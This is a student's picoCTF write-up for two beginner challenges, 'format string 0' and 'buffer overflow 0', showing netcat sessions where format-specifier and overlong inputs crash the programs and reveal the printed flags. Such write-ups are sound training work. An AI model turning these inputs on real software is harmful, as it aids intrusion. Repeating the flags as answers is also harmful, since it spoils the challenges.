
# format string 0

**flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}`

**Thought Process**

* Since the first hint encouraged us to know about **format specifiers**, I knew the vulnerability would be something related to that.
* The second hint told us to try out different options. This, of course, referred to the code giving us options to input and it implied that inputting certain options would give us the flag.

Now, when you initially start the instance from the website, you're shown this:

```bash
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation:
```

At the first glance, instinctively I picked `Gr%114d_Cheese` has it had a format specifier (denoted by `%`, `%114d` just represents the number of characters it can hold) in it.  Upon that input, we're hit with:

```bash
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
```

As we can tell, there was a little bit of a glitch with the spacing, which further exposes the format specifier vulnerability. Now, obviously, we're gonna choose the option that has more number of `%`s, which is `Cla%sic_Che%s%steak`.  This then gives us the flag.

**Alternative Method**

After going thru the code provided to us, I noticed that there would be a certain threshold of the amount of characters I can give as input before the program malfunctions. So I tried inputting random number of characters and after I gave it 55 characters (to be exact), it directly spat out the flag.

```bash
shady@WIN-3CTPHJ9NI00:~$ nc mimas.picoctf.net 57883
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: noewnfnufnisbfaeisbfisabfaesbfsbfnefunfeneafaioufbeubfea
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```

**Two things I noticed here are**: 
* The long string to be inputted does not require `%`s in it at all. A collection of random alphanumeric characters worked.
* The string had to be exactly 55 characters or more. Although I cannot explain why the number is 55 and not 64 or 32, I found it out thru trial and error. 

**Mistakes Made**

* Spent too much time trying to understand and modify the code to make it give me the flag. Pretty dumb move in hindsight. 

# buffer overflow 0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`

**Thought Process**

* Since this is another question using the concept of **buffer overflow**, I juts went thru the code once and noticed that to overflow `buf2`, I'd need to exceed it's capacity of **16 bytes**.
* I started with 16 and eventually, at 20 characters, It outputted the flag.

Here's the input and output for 19 and 20 characters respectively:

```bash
nc saturn.picoctf.net 50321
Input: uebfdiuewbfisdsssds
The program will exit now
^C

nc saturn.picoctf.net 50321
Input: uebfdiuewbfisdsssdsh
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```




